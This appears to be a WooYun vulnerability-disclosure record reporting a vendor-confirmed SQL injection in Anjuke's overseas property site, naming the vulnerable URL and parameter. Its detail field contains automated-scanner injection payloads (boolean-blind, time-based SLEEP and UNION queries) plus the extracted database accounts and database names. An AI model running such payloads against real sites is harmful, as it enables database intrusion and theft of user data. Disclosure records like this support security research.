{"id": 73790, "wybug_id": "wooyun-2015-0163623", "wybug_title": "安居客SQL注入漏洞root权限大量用户数据", "wybug_corp": "安居客", "wybug_author": "路人甲", "wybug_date": "2015-12-22 18:57", "wybug_open_date": "2016-02-04 17:47", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向公众公开  简要描述： 安居客SQL注入漏洞·root权限·大量用户数据 详细说明：  海外地产 - 58安居客官网链接：http://haiwai.anjuke.com漏洞URL：http://haiwai.anjuke.com/list/s?g=6数据库-版本： MySQL> 5.0.11 脆弱点：g 用户：'active_user'@'%' 'aifang'@'%' 'dbadmin'@'%' 'deploy_rx'@'%' 'job_heartbeat'@'%' 'monitor'@'%' 'readonly_v2'@'%' 'repl'@'%' 'root'@'localhost' 数据库名称：u'activecollab', u'aifang_adm', u'aifang_bbs', u'aifang_callcenter', u'aifang_dw', u'aifang_inform_dw', u'aifang_labs', u'aifang_log', u'aifang_message_db', u'aifang_monitor_db', u'aifang_trip', u'aifangcrm_db', u'aifanguser_db', u'custom_dw', u'fenxiao_db', u'heartbeat_db', u'ifstats_db', u'ifx_db', u'igivetest_db', u'info_db', u'information_schema', u'mogilefs_xinfang', u'mysql', u'newdeploy_db', u'newhome_db', u'open_db', u'percona', u'performance_schema', u'scheduler_db', u'test'详细检测日志：[{u'status': 1, u'type': 0, u'value': [{u'dbms': u'MySQL', u'suffix': u'-- [RANDSTR]', u'clause': [1], u'ptype': 1, u'dbms_version': [u'> 5.0.11'], u'prefix': u'', u'place': u'GET', u'data': {u'1': {u'comment': u'', u'matchRatio': 0.582, u'title': u'AND boolean-based blind - WHERE or HAVING clause', u'templatePayload': None, u'vector': u'AND [INFERENCE]', u'where': 1, u'payload': u'g=6 AND 6678=6678-- kHEn'}, u'4': {u'comment': u'#', u'matchRatio': 0.582, u'title': u'MySQL > 5.0.11 stacked queries (SELECT - comment)', u'templatePayload': None, u'vector': u';(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', u'where': 1, u'payload': u'g=6;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))CKHZ)#'}, u'6': {u'comment': u'-- -', u'matchRatio': 0.582, u'title': u'Generic UNION query (NULL) - 1 to 20 columns', u'templatePayload': None, u'vector': [0, 1, u'-- -', u'', u'-- [RANDSTR]', u'NULL', 1, True, False], u'where': 1, u'payload': u'g=6 UNION ALL SELECT CONCAT(0x7171716271,0x79716d4b746c726551644a4a7a496f5450746d6967696b5a576544785657685a56516572706b697a,0x71786a6271)-- -'}}, u'conf': {u'string': None, u'notString': None, u'titles': False, u'regexp': None, u'textOnly': False, u'optimize': False}, u'parameter': u'g', u'os': None}]}, {u'status': 1, u'type': 7, u'value': [u\"'active_user'@'%'\", u\"'aifang'@'%'\", u\"'dbadmin'@'%'\", u\"'deploy_rx'@'%'\", u\"'job_heartbeat'@'%'\", u\"'monitor'@'%'\", u\"'readonly_v2'@'%'\", u\"'repl'@'%'\", u\"'root'@'localhost'\"]}, {u'status': 1, u'type': 11, u'value': [u'activecollab', u'aifang_adm', u'aifang_bbs', u'aifang_callcenter', u'aifang_dw', u'aifang_inform_dw', u'aifang_labs', u'aifang_log', u'aifang_message_db', u'aifang_monitor_db', u'aifang_trip', u'aifangcrm_db', u'aifanguser_db', u'custom_dw', u'fenxiao_db', u'heartbeat_db', u'ifstats_db', u'ifx_db', u'igivetest_db', u'info_db', u'information_schema', u'mogilefs_xinfang', u'mysql', u'newdeploy_db', u'newhome_db', u'open_db', u'percona', u'performance_schema', u'scheduler_db', u'test']}, {'detectStatus': True}]   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-12-22 19:04 厂商回复： 感谢对安居客的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}